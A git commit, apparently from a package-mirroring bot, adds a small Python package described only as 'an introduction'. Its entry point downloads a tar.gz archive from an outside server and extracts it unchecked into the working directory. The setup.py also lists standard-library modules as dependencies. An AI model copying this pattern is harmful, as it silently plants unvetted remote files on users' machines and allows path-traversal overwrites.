e89f1eba751ff96a459d7ea04f7af5ff666db282
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:11:53 +0000

    Add package sina-seifouri/0.29/sina_seifouri-0.29.tar.gz

---
+++ packages/sina-seifouri/sina_seifouri-0.29.tar.gz/sina_seifouri-0.29/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+
+
+setup(
+    name='sina_seifouri',
+    version='0.29',
+    license='MIT',
+    author="Sina Seifouri",
+    author_email='sinasox@gmail.com',
+    packages=find_packages('src'),
+    package_dir={'': 'src'},
+    url='https://github.com/sinasox/sina_seifouri',
+    keywords='This is just an introduction.',
+    entry_points={
+        'console_scripts': [
+            'sina_seifouri=sina_seifouri:main'
+        ]
+    },
+    install_requires=[
+        'zipfile','requests', 'tarfile'
+
+    ],
+
+)
---
+++ packages/sina-seifouri/sina_seifouri-0.29.tar.gz/sina_seifouri-0.29/src/sina_seifouri/__init__.py
@@ -0,0 +1,18 @@
+import requests, zipfile,sys,os,tarfile
+zip_file_url = "https://www.s79.ir/tmp/test.tar.gz"
+
+def main():
+    r = requests.get(zip_file_url, stream=True)
+    with open('tmp.tgz', 'wb') as file:
+        file.write(r.raw.read())
+    tar = tarfile.open("tmp.tgz")
+    tar.extractall(path=os.getcwd())
+    tar.close()
+    os.remove('tmp.tgz')
+
+
+if __name__ == '__main__':
+    main()
+
+if __name__ == 'sina_seifouri.__main__':
+    main()
